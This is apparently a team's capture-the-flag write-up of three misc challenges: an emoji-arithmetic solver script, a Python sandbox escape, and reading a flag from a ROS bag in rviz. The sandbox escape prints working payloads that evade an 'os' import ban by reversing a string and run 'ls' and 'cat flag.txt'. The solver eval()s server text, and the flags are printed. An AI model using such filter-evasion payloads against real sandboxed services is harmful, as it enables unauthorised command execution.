# Misc

## Alien Camp

> Solved By : thewhiteh4t

* The challenge server sends a randomized set of emoji and value pair
* We can get all pairs from option 1
* After getting all pairs we can start calculating values for each question
* If you get EOF Error just restart the script
* After 500 questions we get the flag

```python
    #!/usr/bin/env python3
    
    from pwn import *
    
    host = '46.101.82.40'
    port = 32156
    conn = remote(host, port)
    conn.recvuntil('>').decode()
    print('[+] Getting some help...')
    conn.send('1\n')
    out = conn.recvuntil('\n>').decode()
    help_arr = out.split('\n')
    help_txt = help_arr[2]
    store = help_txt.split(' ')
    emojis = []
    vals = []
    new_store = {}
    counter = 0
    for item in store[0::3]:
        if len(item) > 0:
            emojis.append(item)
    for item in store [2::3]:
        vals.append(item)
    for emo in emojis:
        new_store[emo] = vals[emojis.index(emo)]
    if len(new_store) != 0:
        print('[+] Help recieved!')
    conn.send('2\n')
    def solve(conn):
        global counter
        if counter != 500:
            q_txt = conn.recvuntil('?').decode()
            q_txt = q_txt.split('\n')
            q_txt = q_txt[-1]
            print(f'[Q:{counter}] {q_txt}')
            q_txt = q_txt.split('  =')
            q_txt = q_txt[0]
            q_emo = q_txt.split(' ')
            for elem in q_emo:
                if elem in new_store:
                    q_txt = q_txt.replace(elem, new_store[elem])
            ans = eval(q_txt)
            print(f'[+] Sending {ans}')
            conn.send(str(ans) + '\n')
        else:
            flag = conn.recvuntil('}').decode()
            print(flag)
            conn.close()
        counter += 1
    while counter <= 500:
        solve(conn)
```

---

## Input as a service

> Solved by : ava

* We are given a py-jail 
* https://programmer.help/blogs/python-sandbox-escape.html 
* I used this website as reference, `os` and such imports are banned, so we used string manipulation
* we just reverse the string `os` to `so` and import it and then do `ls` command to * * see the `flag.txt` and then just `cat` the flag
* the code to do is given below

```bash
# use this to check the files present

__import__('so'[::-1]).system('ls')

# this is called reverse print method, "so" actually os

flag.txt
input_as_a_service.py

# read the file

__import__('so'[::-1]).system('cat flag.txt')

CHTB{4li3n5_us3_pyth0n2.X?!}
```

---

## Robotic Infiltration

> Solved by : thewhiteh4t

* We got a `capture.bag` file in this one
* The challenge mentions ROS which leads to a utility called `rosbag`
* rosbag can be used to play this bag file
* Installation and tutorials are given in ros wiki : http://wiki.ros.org/Documentation
* The challenge mentions `rebuild plan for facility`
* after some poking around we saw rosbag comes with another utility known as `rviz`
* rviz can be used for 3d visualization of bag files

**Step 1 : Start roscore**

![](https://i.imgur.com/ZsoFhr6.png)

**Step 2 : Play bag file**

```bash
$ rosbag play capture.bag
```

**Step 3 : Launch rviz**

```bash
$ rosrun rviz rviz
```

* Now all we had to do was tweak things in rviz a little to improve visibility and eventually we spotted the flag

![](https://i.imgur.com/CIeNKFz.png)

* After some play and pause action we got the full flag

```
CHTB{r0s_1s_r0b0tic_p0w3r}
```

![](robotic.gif)